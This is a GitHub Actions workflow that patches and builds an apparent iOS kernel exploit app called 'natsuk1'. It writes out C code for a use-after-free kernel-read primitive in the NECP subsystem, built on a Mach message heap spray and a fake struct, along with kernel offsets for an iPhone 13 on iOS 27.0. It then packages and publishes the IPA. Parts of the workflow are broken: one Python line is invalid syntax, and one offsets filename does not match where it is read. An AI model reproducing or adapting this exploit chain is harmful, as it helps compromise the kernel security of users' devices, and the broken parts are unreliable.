name: 1 · Fix and Test

on:
  push:
    branches: [ main ]
  workflow_dispatch:

permissions:
  contents: write

concurrency:
  group: fix-test-${{ github.ref }}
  cancel-in-progress: false

jobs:
  fix-and-test:
    runs-on: macos-26
    timeout-minutes: 30
    steps:
      - uses: actions/checkout@v5
        with:
          fetch-depth: 0

      - uses: maxim-lobanov/setup-xcode@v1
        with:
          xcode-version: "26.5"

      - name: Remove competing workflow
        run: |
          rm -f .github/workflows/natsuk1.yml
          rm -f .github/workflows/main.yml

      - name: Patch necp.c
        run: |
          set -euo pipefail
          mkdir -p /tmp/nk

          cat > /tmp/nk/kread.c <<'CEOF'
          static void dump_buf_words(const char *tag, const uint8_t *p, int n, int maxw) {
              char line[512];
              int off = 0;
              for (int i = 0; i < n && i < maxw; i++) {
                  uint64_t w; memcpy(&w, p + i*8, 8);
                  off += snprintf(line + off, sizeof(line) - off,
                                  "%02d:0x%016llx ", i, (unsigned long long)w);
                  if (off > 400) break;
              }
              log_info(tag, "%s", line);
          }

          static int kread_raw(uint64_t target_kaddr, uint32_t read_len) {
              uint8_t fake[NCF_STRUCT_SZ];
              memset(fake, 0, sizeof(fake));
              *(uint64_t*)(fake + NCF_ASSIGNED_OFF)     = target_kaddr;
              *(uint64_t*)(fake + NCF_ASSIGNED_LEN_OFF) = read_len;
              *(uint64_t*)(fake + NCF_PARENT_OFF)       = 0;
              log_info("RAW", "read 0x%llx len=%u fake[a=0x%llx l=0x%llx p=0x%llx]",
                       (unsigned long long)target_kaddr, read_len,
                       (unsigned long long)target_kaddr,
                       (unsigned long long)read_len, (unsigned long long)0);

              uint8_t junk[NCF_STRUCT_SZ]; memset(junk, 0x41, sizeof(junk));
              mach_port_t ex = port_new();
              if (ex == MACH_PORT_NULL) { log_err("RAW", "port_new fail"); return -1; }
              ool_spray(ex, junk, NCF_STRUCT_SZ, EXHAUST_N);

              int fd = necp_open_fd();
              if (fd < 0) { log_err("RAW", "necp_open errno=%d", errno);
                            mach_port_destroy(mach_task_self(), ex); return -1; }

              uint8_t cuuid[16], fuuid[16];
              int rc_ac = necp_add_client(fd, cuuid);
              int rc_af = (rc_ac == 0) ? necp_add_flow(fd, cuuid, fuuid) : -1;
              log_info("RAW", "ac=%d af=%d fd=%d", rc_ac, rc_af, fd);
              if (rc_ac != 0 || rc_af != 0) {
                  close(fd); mach_port_destroy(mach_task_self(), ex); return -2;
              }

              necp_remove_flow(fd, fuuid);

              ool_drain(ex, EXHAUST_N);
              mach_port_destroy(mach_task_self(), ex);
              usleep(200);

              mach_port_t sp = port_new();
              if (sp == MACH_PORT_NULL) { log_err("RAW", "spray port fail"); close(fd); return -1; }
              ool_spray(sp, fake, NCF_STRUCT_SZ, SPRAY_N);
              usleep(150);

              memset(g_res_buf, 0, RESULT_BUF_SZ);
              int ret = necp_copy_result(fd, cuuid, g_res_buf, RESULT_BUF_SZ);
              log_info("RAW", "copy_result ret=%d", ret);
              if (ret > 0) {
                  int nw = ret / 8; if (nw > 4) nw = 4;
                  dump_buf_words("RAW", g_res_buf, nw, 4);
              }

              ool_drain(sp, SPRAY_N);
              mach_port_destroy(mach_task_self(), sp);
              close(fd);
              return ret;
          }
          CEOF

          cat > /tmp/nk/calib.c <<'CEOF'
          static int calibrate_kread(void) {
              if (g_res_off >= 0) return 0;
              const uint64_t expected = 0xFFFFFFF00ADEE310ULL;
              log_info("CAL", "anchor=kernproc@0x%llx expect=0x%llx",
                       (unsigned long long)OFF_KERNPROC,
                       (unsigned long long)expected);

              for (int attempt = 0; attempt < 12; attempt++) {
                  log_info("CAL", "----- attempt %d/12 -----", attempt);
                  int r = kread_raw(g_kbase + OFF_KERNPROC, 8);
                  log_info("CAL", "attempt %d ret=%d", attempt, r);

                  if (r <= 0) {
                      log_warn("CAL", "retry (ret<=0)");
                      usleep(400);
                      continue;
                  }

                  if (r >= 8) {
                      int nw = r / 8; if (nw > 8) nw = 8;
                      dump_buf_words("CAL", g_res_buf, nw, 8);
                  }

                  int found = 0;
                  for (int i = 0; i <= r - 8; i++) {
                      uint64_t v; memcpy(&v, g_res_buf + i, 8);
                      if (v >= KPTR_MIN && v <= KPTR_MAX) {
                          g_res_off = i;
                          log_ok("CAL", "attempt %d kptr=0x%llx at off=0x%x %s",
                                 attempt, (unsigned long long)v, i,
                                 (v == expected) ? "MATCH" : "other");
                          found = 1;
                          break;
                      }
                  }
                  if (found) return 0;

                  log_warn("CAL", "attempt %d ret=%d no kptr in buf", attempt, r);
                  usleep(400);
              }
              log_err("CAL", "gave up after 12 attempts");
              return -1;
          }
          CEOF

          cat > /tmp/nk/run.c <<'CEOF'
          static volatile int g_busy = 0;

          static int nk_necp_run_impl(void) {
              nk_log("");
              nk_log("=== natsuk1 v1.4 (natsuk1-kread-v4) ===");
              nk_log("target: iOS 27.0 / XNU / arm64e");
              nk_log("device: iPhone14,5 / iPhone14,7");
              nk_log("");
              log_info("INIT", "NCF_ASSIGNED_OFF=0x%x NCF_ASSIGNED_LEN_OFF=0x%x NCF_REFCNT_OFF=0x%x NCF_PARENT_OFF=0x%x EXHAUST_N=%d SPRAY_N=%d",
                       NCF_ASSIGNED_OFF, NCF_ASSIGNED_LEN_OFF, NCF_REFCNT_OFF, NCF_PARENT_OFF,
                       EXHAUST_N, SPRAY_N);
              log_info("P1", "slide fallback");
              g_slide = 0x3D00000ULL;
              g_kbase = KERNEL_BASE_STATIC + g_slide;
              log_ok("P1", "kbase=0x%llx", (unsigned long long)g_kbase);
              {
                  int fd = necp_open_fd();
                  if (fd < 0) { log_err("P2", "necp_open errno=%d", errno); return 1; }
                  close(fd);
                  log_ok("P2", "necp OK");
              }
              log_info("P3", "kread calibration");
              if (calibrate_kread() != 0) { log_err("P3", "failed"); return 1; }
              log_ok("P3", "kread ready (result offset=0x%x)", g_res_off);
              log_info("P4", "sanity: read anchors");
              if (sanity_check() != 0) { log_err("P4", "sanity failed"); return 1; }
              log_info("P5", "sanity: proc chain");
              if (task_sanity() != 0) { log_warn("P5", "chain broken"); }
              log_ok("DONE", "leak + slide + kread chain complete");
              nk_log("");
              nk_log("=== RESULT ===");
              nk_logx("RESULT", "kbase   = 0x%016llX", (unsigned long long)g_kbase);
              nk_logx("RESULT", "slide   = 0x%016llX", (unsigned long long)g_slide);
              nk_logx("RESULT", "kread   = 0x%016llX + 0x%llX",
                      (unsigned long long)KERNEL_BASE_STATIC,
                      (unsigned long long)OFF_KERNPROC);
              nk_log("");
              return 0;
          }

          int nk_necp_run(void) {
              if (__sync_lock_test_and_set(&g_busy, 1)) {
                  nk_log("[!] already running");
                  return 1;
              }
              int rc = nk_necp_run_impl();
              __sync_lock_release(&g_busy);
              return rc;
          }
          CEOF

          python3 - <<'PYEOF'
          import re, sys
          p = "natsuk1/Exploit/necp.c"
          s = open(p).read()

          if "natsuk1-kread-v4" in s:
              print("already patched")
              sys.exit(0)

          orig = s
          kread = open("/tmp/nk/kread.c").read().rstrip()
          calib = open("/tmp/nk/calib.c").read().rstrip()
          run   = open("/tmp/nk/run.c").read().rstrip()

          s = re.sub(r"static int kread_raw\(uint64_t kaddr, uint32_t len\) \{.*?\n\}\n",
                     kread + "\n\n", s, count=1, flags=re.DOTALL)

          s = re.sub(r"static int calibrate_kread\(void\) \{.*?\n\}\n",
                     calib + "\n\n", s, count=1, flags=re.DOTALL)

          s = re.sub(r"int nk_necp_run\(void\) \{.*?\n\}\n",
                     run + "\n", s, count=1, flags=re.DOTALL)

          if "natsuk1-kread-v4" not24 in s:
              print("ERROR: marker not inserted")
              sys.exit(1)

          assert s != orig, "no changes"
          open(p, "w").write(s)
          print("necp.c v4 patched")
          PYEOF

      - name: Write Offsets JSON
        run: |
          mkdir -p natsuk1/Offsets
          cat > natsuk1/Offsets/iPhone14,5_iOS27.0_A437.json <<'JSON'
          {
            "groups": [
              { "title": "Kernel",  "items": ["off_kernel_base","off_sysent_base","off_sysent_count","off_sysent_stride","off_mach_trap_table"] },
              { "title": "Globals", "items": ["off_g_kernproc","off_g_task_list","off_g_allproc","off_g_kernel_task","off_g_zone_map","off_g_kernel_map"] },
              { "title": "Primitives", "items": ["off_fn_copyin","off_fn_copyout","off_fn_kalloc_ext","off_fn_kfree_ext"] },
              { "title": "proc", "items": ["off_proc_p_list_next","off_proc_p_pid","off_proc_p_task","off_proc_ro_p_ucred","off_proc_p_csflags"] },
              { "title": "task / thread", "items": ["off_task_map","off_task_bsd_info","off_task_itk_space","off_task_cr_label","off_thread_task_threads_next"] },
              { "title": "ucred", "items": ["off_ucred_cr_uid","off_ucred_cr_svuid","off_ucred_cr_gid","off_ucred_cr_svgid"] },
              { "title": "NECP", "items": ["off_necp_open","off_necp_client_add_flow","off_necp_client_remove_flow","off_ncf_assigned","off_ncf_assigned_len","off_ncf_parent","off_ncf_refcnt","off_ncf_struct_sz"] },
              { "title": "Zones", "items": ["off_zone_data_kalloc","off_zone_early_kalloc","off_zone_kalloc_type_var","off_zone_site_struct_task","off_zone_site_struct_proc","off_zone_site_struct_thread","off_zone_site_struct_ucred","off_zone_site_struct_ipc_port","off_zone_site_struct_ipc_entry","off_zone_site_struct_fileproc","off_zone_site_struct_fileglob","off_zone_site_struct_vnode","off_zone_site_struct_mount","off_zone_site_struct_socket","off_zone_site_struct_inpcb","off_zone_site_struct_pipe","off_zone_site_struct_vm_page"] },
              { "title": "SPTM", "items": ["off_sptm_base","off_sptm_ctrr_lock_boot","off_sptm_cpu_lock_system_registers","off_sptm_determine_kernel_ctrr","off_sptm_bootstrap","off_sptm_map","off_sptm_region","off_sptm_panic","off_sptm_page_table"] }
            ],
            "defaults": {
              "off_kernel_base": "0xFFFFFFF007004000",
              "off_sysent_base": "0x0",
              "off_sysent_count": "558",
              "off_sysent_stride": "24",
              "off_mach_trap_table": "0xFFFFFFF007BE8018",
              "off_g_kernproc": "0xFFFFFFF007BBF040",
              "off_g_task_list": "0xFFFFFFF0080D93F0",
              "off_g_allproc": "0x0",
              "off_g_kernel_task": "0x0",
              "off_g_zone_map": "0x0",
              "off_g_kernel_map": "0x0",
              "off_fn_copyin": "0xFFFFFFF00A7B9570",
              "off_fn_copyout": "0xFFFFFFF00A2C6C28",
              "off_fn_kalloc_ext": "0xFFFFFFF00A200DCC",
              "off_fn_kfree_ext": "0xFFFFFFF00A201000",
              "off_proc_p_list_next": "0x0",
              "off_proc_p_pid": "0x74",
              "off_proc_p_task": "0x78",
              "off_proc_ro_p_ucred": "0x98",
              "off_proc_p_csflags": "0xA8",
              "off_task_map": "0x28",
              "off_task_bsd_info": "0x4E0",
              "off_task_itk_space": "0x320",
              "off_task_cr_label": "0xE8",
              "off_thread_task_threads_next": "0x50",
              "off_ucred_cr_uid": "0x18",
              "off_ucred_cr_svuid": "0x1C",
              "off_ucred_cr_gid": "0x20",
              "off_ucred_cr_svgid": "0x24",
              "off_necp_open": "0xFFFFFFF00A4E411C",
              "off_necp_client_add_flow": "0xFFFFFFF00A4E843C",
              "off_necp_client_remove_flow": "0xFFFFFFF00A4E93C4",
              "off_ncf_assigned": "0x68",
              "off_ncf_assigned_len": "0x70",
              "off_ncf_parent": "0x88",
              "off_ncf_refcnt": "0x58",
              "off_ncf_struct_sz": "0x100",
              "off_zone_data_kalloc": "0xFFFFFFF007C62E70",
              "off_zone_early_kalloc": "0xFFFFFFF007BBB170",
              "off_zone_kalloc_type_var": "0xFFFFFFF007BC2800",
              "off_zone_site_struct_task": "0xFFFFFFF007C64080",
              "off_zone_site_struct_proc": "0xFFFFFFF007C71240",
              "off_zone_site_struct_thread": "0xFFFFFFF007C63D00",
              "off_zone_site_struct_ucred": "0xFFFFFFF007C6F140",
              "off_zone_site_struct_ipc_port": "0xFFFFFFF007C79248",
              "off_zone_site_struct_ipc_entry": "0xFFFFFFF007C79298",
              "off_zone_site_struct_fileproc": "0xFFFFFFF007C7CD08",
              "off_zone_site_struct_fileglob": "0xFFFFFFF007C7D708",
              "off_zone_site_struct_vnode": "0xFFFFFFF007C660C0",
              "off_zone_site_struct_mount": "0xFFFFFFF007C662C0",
              "off_zone_site_struct_socket": "0xFFFFFFF007C70C40",
              "off_zone_site_struct_inpcb": "0xFFFFFFF007C6D180",
              "off_zone_site_struct_pipe": "0xFFFFFFF007C6FE80",
              "off_zone_site_struct_vm_page": "0xFFFFFFF007C64C80",
              "off_sptm_base": "0xFFFFFFF027004000",
              "off_sptm_ctrr_lock_boot": "0xFFFFFFF027006E62",
              "off_sptm_cpu_lock_system_registers": "0xFFFFFFF0270B39B4",
              "off_sptm_determine_kernel_ctrr": "0xFFFFFFF0270B2224",
              "off_sptm_bootstrap": "0xFFFFFFF0270D21CC",
              "off_sptm_map": "0xFFFFFFF0270E97BC",
              "off_sptm_region": "0xFFFFFFF0270ECFF0",
              "off_sptm_panic": "0xFFFFFFF0270BEE18",
              "off_sptm_page_table": "0xFFFFFFF0270D13D4"
            }
          }
          JSON

      - name: Write offsets index
        run: |
          cat > natsuk1/Offsets/index.json <<'JSON'
          {
            "versions": [
              {
                "file": "iPhone14,5_iOS27.0_24A437.json",
                "device": "iPhone14,5",
                "deviceName": "iPhone 13",
                "chip": "A15 Bionic",
                "ios": "27.0",
                "build": "24A437",
                "verified": false
              }
            ]
          }
          JSON

      - name: Verify
        run: |
          set -euo pipefail
          F=natsuk1/Exploit/necp.c
          grep -q "natsuk1-kread-v4" "$F"
          grep -q "dump_buf_words" "$F"
          grep -q -e "----- attempt" "$F"
          grep -q "g_busy" "$F"
          python3 - <<'PYEOF'
          import json
          d = json.load(open("natsuk1/Offsets/iPhone14,5_iOS27.0_24A437.json"))
          items = sum(len(g["items"]) for g in d["groups"])
          assert items == len(d["defaults"])
          assert d["defaults"]["off_proc_ro_p_ucred"] == "0x98"
          assert d["defaults"]["off_ucred_cr_uid"] == "0x18"
          print("OK: %d offsets" % items)
          PYEOF

      - name: Install tools
        run: brew install xcodegen ldid || true

      - name: Generate xcodeproj
        run: xcodegen generate

      - name: Build
        run: |
          set -euo pipefail
          xcodebuild \
            -project natsuk1.xcodeproj -scheme natsuk1 -configuration Release \
            -sdk iphoneos -destination 'generic/platform=iOS' \
            -derivedDataPath build -parallelizeTargets -jobs "$(sysctl -n hw.ncpu)" \
            CODE_SIGNING_ALLOWED=NO SWIFT_VERSION=5.0 SWIFT_STRICT_CONCURRENCY=minimal \
            OTHER_SWIFT_FLAGS="-Xfrontend -disable-dynamic-actor-isolation -Xfrontend -disable-actor-data-race-checks" \
            -UseModernBuildSystem=YES build -quiet

      - name: Package app tarball
        run: |
          set -euo pipefail
          APP_PATH="$(find build/Build/Products/Release-iphoneos -maxdepth 1 -name '*.app' -print -quit)"
          [ -z "$APP_PATH" ] && { echo "no .app"; exit 1; }
          tar -czf natsuk1-app.tar.gz -C "$(dirname "$APP_PATH")" "$(basename "$APP_PATH")"

      - name: Upload app artifact
        uses: actions/upload-artifact@v4
        with:
          name: natsuk1-app-tar
          path: natsuk1-app.tar.gz
          if-no-files-found: error
          retention-days: 3

      - name: Package and release
        env:
          GH_TOKEN: ${{ github.token }}
        run: |
          set -euo pipefail
          APP_PATH="$(find build/Build/Products/Release-iphoneos -maxdepth 1 -name '*.app' -print -quit)"
          ldid -Snatsuk1/Resources/natsuk1.entitlements "$APP_PATH/natsuk1"
          rm -rf Payload natsuk1.ipa
          mkdir -p Payload
          cp -R "$APP_PATH" Payload/
          COPYFILE_DISABLE=1 zip -qry natsuk1.ipa Payload
          rm -rf Payload
          if gh release view development >/dev/null 2>&1; then gh release delete development --yes --cleanup-tag; fi
          gh release create development natsuk1.ipa \
            --target "${GITHUB_SHA}" --title "Development" \
            --prerelease --latest=false \
            --notes "kread v4: verbose per-attempt diagnostics + buffer dumps"

      - name: Commit
        run: |
          set -euo pipefail
          git config user.name "github-actions[bot]"
          git config user.email "github-actions[bot]@users.noreply.github.com"
          git add natsuk1/Exploit/necp.c natsuk1/Offsets/
          if git diff --cached --quiet; then echo "no changes"; exit 0; fi
          git commit -m "kread v4: verbose diagnostics [skip ci]"
          git push
